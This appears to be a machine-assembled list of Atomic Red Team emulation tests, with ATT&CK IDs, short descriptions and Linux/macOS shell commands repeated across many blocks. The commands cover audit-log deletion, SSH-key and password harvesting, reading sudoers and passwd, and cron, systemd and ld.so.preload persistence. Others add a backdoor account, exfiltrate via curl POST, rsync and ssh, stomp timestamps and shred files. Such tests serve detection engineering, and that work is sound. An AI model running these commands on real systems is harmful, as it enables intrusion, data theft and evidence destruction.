rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1168 ,T1153 ,T1145 ,T1018 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1501 ,T1064 ,T1145 ,T1033 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1136 ,T1153 ,T1139 ,T1087 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1215 ,T1064 ,T1081 ,T1087 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1136 ,T1153 ,T1139 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1154 ,T1145 ,T1018 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1168 ,T1153 ,T1081 ,T1033 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1064 ,T1081 ,T1082 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1154 ,T1040 ,T1135 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1154 ,T1145 ,T1069 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1158 ,T1153 ,T1139 ,T1087 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1064 ,T1139 ,T1069 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1136 ,T1064 ,T1139 ,T1201 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1136 ,T1064 ,T1081 ,T1087 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


